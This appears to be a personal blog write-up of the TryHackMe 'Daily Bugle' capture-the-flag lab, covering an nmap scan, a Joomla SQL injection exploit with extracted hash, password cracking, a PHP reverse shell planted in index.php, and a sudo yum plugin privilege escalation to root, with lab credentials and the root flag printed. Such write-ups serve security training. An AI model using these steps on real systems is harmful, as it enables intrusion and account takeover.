---
layout : post 
title: dailybungle
image : dailybuglepng.png
date: 2021-04-25 01:43 +0530

tags: [John TheRipper ,  gtfobin yum]
---

# Nmap

```
 nmap -sC -sV 10.10.10.5  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 01:50 EDT
Nmap scan report for 10.10.10.5 (10.10.10.5)
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

```

# Exploitation

joomblah 3.7.0 is vulnerble for SQLI 

```
python exploit.py  http://10.10.10.5                 
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```
<h3>JohnTheRipper</h3>
cracking the hash of jonah 

copy the hash to password_hash

>john  --wordlist=~/rockyou.txt password_hash

```
john  --wordlist=~/rockyou.txt password_hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:05:15 0.20% (ETA: 2021-04-26 21:51) 0g/s 108.9p/s 108.9c/s 108.9C/s 010294..ultraviolet
spiderman123     (?)
1g 0:00:07:09 DONE (2021-04-25 01:48) 0.002328g/s 109.0p/s 109.0c/s 109.0C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
`jonah:spiderman123`

![]({{site.baseurl}}/img/tryhackme/dailyBugle/login.png)

Gaining ReverseShell

![]({{site.baseurl}}/img/tryhackme/dailyBugle/processn.png)

lets replace the index.php code with [PHPReverseShell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php): code 

![]({{site.baseurl}}/img/tryhackme/dailyBugle/edit.png)

![]({{site.baseurl}}/img/tryhackme/dailyBugle/revshell.png)

got the revershell

![]({{site.baseurl}}/img/tryhackme/dailyBugle/gotshell.png)


# PrivilageEsclation

from linpeasout put at `/var/www/html/configuration.php`

![]({{site.baseurl}}/img/tryhackme/dailyBugle/config.php.png)

got password `jjameson:nv5uz9r3ZEDzVjNu`

user jjameson can rum yum as root without passwd 

![]({{site.baseurl}}/img/tryhackme/dailyBugle/sudo.png)

```
[jjameson@dailybugle tmp]$ TF=$(mktemp -d)
[jjameson@dailybugle tmp]$ cat >$TF/x<< EOF  
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle tmp]$ 
[jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle tmp]$ 
[jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>    os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle tmp]$ 
[jjameson@dailybugle tmp]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# wgoami
sh: wgoami: command not found
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79

```



